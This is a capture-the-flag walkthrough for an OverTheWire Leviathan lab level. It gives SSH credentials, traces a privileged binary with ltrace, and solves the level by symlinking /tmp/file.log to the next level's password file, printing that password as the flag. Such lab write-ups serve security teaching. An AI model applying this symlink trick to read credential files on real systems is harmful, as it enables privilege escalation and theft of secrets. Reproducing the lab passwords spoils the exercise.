# Level 4
## Connection
~~~~
$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223
Password: Tith4cokei
~~~~

## Solution

~~~~
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ echo "some text here" > /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
some text here
~~~~

The program reads the file and display the characters 1 by 1:
~~~~
$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                     = 0x804b008
fgetc(0x804b008)                                                = 's'
feof(0x804b008)                                                 = 0
putchar(115, 0x8048720, 0xf7e40890, 0x80486eb)                  = 115
fgetc(0x804b008)                                                = 'o'
feof(0x804b008)                                                 = 0
putchar(111, 0x8048720, 0xf7e40890, 0x80486eb)                  = 111
fgetc(0x804b008)                                                = 'm'
feof(0x804b008)                                                 = 0
putchar(109, 0x8048720, 0xf7e40890, 0x80486eb)                  = 109
fgetc(0x804b008)                                                = 'e'
feof(0x804b008)                                                 = 0
putchar(101, 0x8048720, 0xf7e40890, 0x80486eb)                  = 101
fgetc(0x804b008)                                                = ' '
feof(0x804b008)                                                 = 0
putchar(32, 0x8048720, 0xf7e40890, 0x80486eb)                   = 32
fgetc(0x804b008)                                                = 't'
feof(0x804b008)                                                 = 0
putchar(116, 0x8048720, 0xf7e40890, 0x80486eb)                  = 116
fgetc(0x804b008)                                                = 'e'
feof(0x804b008)                                                 = 0
putchar(101, 0x8048720, 0xf7e40890, 0x80486eb)                  = 101
fgetc(0x804b008)                                                = 'x'
feof(0x804b008)                                                 = 0
putchar(120, 0x8048720, 0xf7e40890, 0x80486eb)                  = 120
fgetc(0x804b008)                                                = 't'
feof(0x804b008)                                                 = 0
putchar(116, 0x8048720, 0xf7e40890, 0x80486eb)                  = 116
fgetc(0x804b008)                                                = ' '
feof(0x804b008)                                                 = 0
putchar(32, 0x8048720, 0xf7e40890, 0x80486eb)                   = 32
fgetc(0x804b008)                                                = 'h'
feof(0x804b008)                                                 = 0
putchar(104, 0x8048720, 0xf7e40890, 0x80486eb)                  = 104
fgetc(0x804b008)                                                = 'e'
feof(0x804b008)                                                 = 0
putchar(101, 0x8048720, 0xf7e40890, 0x80486eb)                  = 101
fgetc(0x804b008)                                                = 'r'
feof(0x804b008)                                                 = 0
putchar(114, 0x8048720, 0xf7e40890, 0x80486eb)                  = 114
fgetc(0x804b008)                                                = 'e'
feof(0x804b008)                                                 = 0
putchar(101, 0x8048720, 0xf7e40890, 0x80486eb)                  = 101
fgetc(0x804b008)                                                = '\n'
feof(0x804b008)                                                 = 0
putchar(10, 0x8048720, 0xf7e40890, 0x80486ebsome text here
)                   = 10
fgetc(0x804b008)                                                = '\377'
feof(0x804b008)                                                 = 1
fclose(0x804b008)                                               = 0
getuid()                                                        = 12005
setuid(12005)                                                   = 0
unlink("/tmp/file.log")                                         = 0
+++ exited (status 0) +++
~~~~

All we need to do is create `/tmp/file.log` as a symbolic link to the password file: 
~~~~
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
~~~~

# Flag
~~~~
leviathan6:UgaoFee4li
~~~~